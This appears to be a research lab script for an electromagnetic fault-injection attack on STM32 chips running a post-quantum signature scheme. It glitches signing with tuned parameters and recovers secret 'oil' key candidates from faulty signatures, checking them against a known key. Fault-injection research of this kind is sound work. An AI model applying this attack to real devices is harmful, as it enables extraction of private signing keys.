
# local imports
from ast import main
from turtle import reset
from chipshouter_profiler.CWUtils import ChipWhisperer
from chipshouter_profiler.CSUtils import ChipShouter
from chipshouter_profiler.config_classes import GlitchConfig, TargetConfig, SimpleSerialPacket

from chipshouter_profiler.simpleserial.simpleserial import TargetSerial

from chipshouter_profiler.simpleserial.simpleserial_readers.cwlite import SimpleSerial_ChipWhispererLite

from chipshouter_profiler.lib.pico_pulsegen.delay_control import DelayController
from chipshouter_profiler.lib.emf_table.table import xyzTable

import os
import sys
import ctypes
import subprocess
import traceback
import time
from dataclasses import dataclass, asdict
import json
import copy
import signal


from tenacity import RetryError

from verification_utils import verify_signature, calculate_oil


current_dir = os.path.dirname(os.path.abspath(__file__))
library_path = os.path.join(current_dir, "build")
shared_lib = ctypes.CDLL(os.path.join(library_path, "validation_functions-test.so"))

last_result = "crash" # crash (unresponsive) / nofault (valid signature) / fault (invalid signature)
last_parsed_data = {}
oil_candidates = []
oil_candidates_validity = []

def send_packet(target_serial, cmd, data=None):
    cmd = TargetSerial.type_convert_cmd(cmd)
    target_serial.send_packet(cmd, data)

def main(build=False, flash=False, home=False):
    global last_result, last_parsed_data

    def reset_target(timeout=5000, retries=3):
        reset_seq = target_serial._reset_sequence
        for _ in range(retries):
            cw.reset_target()
            if target_serial.read_until(reset_seq, timeout).endswith(reset_seq):
                return 0

    def arm_chipshouter():
        # Arm ChipShouter. If it has faults, try to clear them.
        try:
            cs.arm()
        except Exception as e:
            cs.clear_faults()
            time.sleep(0.5)

        # Check ChipShouter temps
        while cs.temps_too_high():
            print("Chipshouter Temp too high, waiting...")
            time.sleep(10)

        # Validate that ChipShouter is ready for trigger
        if not cs.cs.trigger_safe:
            raise RuntimeError("ChipShouter is not ready for trigger (trigger_safe failed)!")

    def crash_handler():
        global last_result
        print(f"offset: {pulse_offset} ; execution {exec_index}/{num_executions}: Target unresponsive")
        reset_target()
        last_result = "crash"

    def attack_data_handler(data):
        global last_result, last_parsed_data
        
        target_serial.send_ack('d')

        # Receive all chunks of `sm` and join them back together
        while True:
            try:
                cmd, raw_data = target_serial.read_packet()
            except Exception as e:
                crash_handler()
                return
            else: # if no exception was raised
                if cmd == target_serial.type_convert_cmd('d'):
                    target_serial.send_ack(cmd)

                    data = data + raw_data # Append to data (type = bytes)
                elif cmd == target_serial.type_convert_cmd('e'):
                    break
                else:
                    print(f"ERROR: unexpected packet with command: {cmd}")

        # Parse msg and sig from `sm`
        fields = [
                ("msg", ctypes.c_uint8 * 256), # 256 bytes message
                ("sig", ctypes.c_uint8 * 128), # 128 bytes signature
            ]
        parsed_data = TargetSerial.parse_packet_data_struct(data, fields)

        result = verify_signature(parsed_data['msg'], parsed_data['sig'])
        if result == 0: # Signature is correct (no fault occurred)
            print(f"offset: {pulse_offset} ; execution {exec_index}/{num_executions}: No fault (correct signature)")
            last_result = "nofault"
            last_parsed_data = dict(parsed_data)
        else: # Signature is incorrect (fault occurred)
            reset_target()
            last_result = "fault"
            parsed_data["oil_candidate"] = bytes(a ^ b for (a, b) in zip(parsed_data['sig'][:68], last_parsed_data['sig'][:68])) + parsed_data['sig'][68:112]
            oil_candidates.append(parsed_data["oil_candidate"].hex().upper())
            print(f"OIL CANDIDATE[{len(oil_candidates)}]: {parsed_data['oil_candidate'].hex()}")

            # parsed_data["msg"]
            # parsed_data["sig"]
            # parsed_data["oil_candidate"]
            # public key can be loaded from keys/pk.h

            # Validation calculate oil with known private key and check (Would normally be done with kipnis-shamir recon)
            parsed_data["expected_oil"] = calculate_oil(parsed_data["msg"], parsed_data["sig"])

            if parsed_data["expected_oil"] == parsed_data["oil_candidate"]: # Signature includes correct oil
                oil_candidates_validity.append(True)
                print("    CORRECT")
            else: # Signature does not include correct oil
                oil_candidates_validity.append(False)
                print("    INCORRECT")

    # ---------------------------------------------------------------------------- #
    #         Glitch Configuration (Adjust according to profiling results)         #
    # ---------------------------------------------------------------------------- #

    # -------------------------- First chip (STM32F415) -------------------------- #
    position = [25.075, 3.331, 15.59]
    voltage = 300
    pulse_width = 70
    # pulse_offsets = range(358984410, 358985345, 10)
    pulse_offsets = [358984420] # 358985195 also works well
    num_executions = 500
    dead_timeout = 1000
    
    # -------------------------- Second chip (STM32F405) ------------------------- #
    # position = [24.575, 3.831, 15.59]
    # voltage = 300
    # pulse_width = 70
    # pulse_offsets = [358984440] # 358984445 also works well
    # num_executions = 100
    # dead_timeout = 1000

    # ---------------------------------------------------------------------------- #
    #                               Prepare hardware                               #
    # ---------------------------------------------------------------------------- #
    # Setup ChipWhisperer
    cw = ChipWhisperer()
    target_serial = TargetSerial(SimpleSerial_ChipWhispererLite, cw.scope)

    # Setup ChipSHOUTER
    cs = ChipShouter()
    cs.disarm()
    cs.voltage = voltage

    # Setup XYZ Table
    table = xyzTable(debug=False)


    # ---------------------------------------------------------------------------- #
    #                  Build firmware, Flash target, Home xyzTable                 #
    # ---------------------------------------------------------------------------- #
    current_dir = os.path.dirname(os.path.abspath(__file__))
    if build:
        subprocess.run(
            ["make", f"target-attack"],
            cwd=current_dir,
            check=True
            # stdout=subprocess.DEVNULL
        )
    if flash:
        cw.flash(os.path.join(current_dir, f"pqm4/bin/crypto_sign_target-attack.hex"))
    if home:
        table.home_all()

    # Move to target position
    x, y, z = position
    table.move_absolute(x, y, z)

    arm_chipshouter()

    target_serial.flush()
    reset_target()


    for pulse_offset in pulse_offsets:
        with DelayController(port="/dev/ttyACM1") as dc:
            dc.set_parameters({"offset": pulse_offset, "length": pulse_width, "spacing": 50, "repeats": 0})

        for exec_index in range(num_executions):
            # If target crashed during last fault injection, generate one signature without faulting to get known val
            if last_result != "nofault":
                with DelayController(port="/dev/ttyACM1") as dc:
                    dc.set_parameters({"offset": pulse_offset, "length": 5, "spacing": 50, "repeats": 0})
                print("nonfault-run")
            else:
                with DelayController(port="/dev/ttyACM1") as dc:
                    dc.set_parameters({"offset": pulse_offset, "length": pulse_width, "spacing": 50, "repeats": 0})
                print("fault-run")

            send_packet(target_serial, "s") # TODO (optional): Allow custom messages (sent to target with start signal)


            if target_serial.wait_ack("s") != 0:
                crash_handler()
            else:
                # Read next packet from target
                try:
                    cmd, raw_data = target_serial.read_packet(timeout=dead_timeout)
                except Exception as e:
                    crash_handler()
                else: # No exception was raised -> response packet received
                    attack_data_handler(raw_data)

    # Finish campaign
    cs.disarm()


def print_results(sig=None, frame=None):
    print("################## RESULTS ##################")
    print(f"OIL CANDIDATES[{len(oil_candidates)}]: ")
    print(oil_candidates)
    print("VALIDITY: ")
    print(oil_candidates_validity)
    sys.exit(0)

if __name__ == '__main__':
    build = False
    flash = False
    home = False
    if len(sys.argv) > 1:
        # Build firmware (based on target_config)
        if "--build" in sys.argv or "-b" in sys.argv:
            build = True
        # Flash chipwhisperer on commandline argument
        if "--flash" in sys.argv or "-f" in sys.argv:
            flash = True
        # Home xyz table on commandline argument
        if "--home" in sys.argv or "-h" in sys.argv:
            home = True


    signal.signal(signal.SIGINT, print_results)
    main(build, flash, home)
    print_results()